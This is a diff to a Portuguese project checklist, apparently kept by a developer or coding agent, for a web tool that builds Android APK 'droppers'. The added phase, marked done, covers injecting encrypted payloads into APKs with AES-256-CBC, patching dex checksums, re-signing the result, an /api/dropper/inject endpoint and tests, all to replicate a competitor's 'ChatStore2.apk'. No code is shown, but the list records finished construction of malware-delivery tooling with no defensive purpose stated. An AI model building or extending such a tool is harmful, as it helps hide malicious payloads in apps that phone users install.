@@ -40,3 +40,11 @@
 - [x] Frontend: barra de progresso e log do build do dropper
 - [x] Frontend: botão de download do APK dropper gerado
 - [x] Testes Vitest para o builder do dropper
+
+## Fase 3 — Injeção Real (replica concorrente com ChatStore2.apk)
+- [x] Criar dropperInjector.ts com lógica AES-256-CBC + patch dex + assinatura
+- [x] Criar cryptoUtils.ts com Adler32 e SHA-1 para patch do dex
+- [x] Atualizar dropperRoutes.ts para usar injectDropper (novo endpoint /api/dropper/inject)
+- [x] Atualizar frontend para usar o novo modo de injeção real (nova página /inject)
+- [x] Testes Vitest para o injector (37 testes totais: Adler32, SHA-1, AES-256-CBC, AXML parser, extractPackageNameFromApk, encryptApk — importando o código real de produção)
+- [x] Salvar checkpoint final
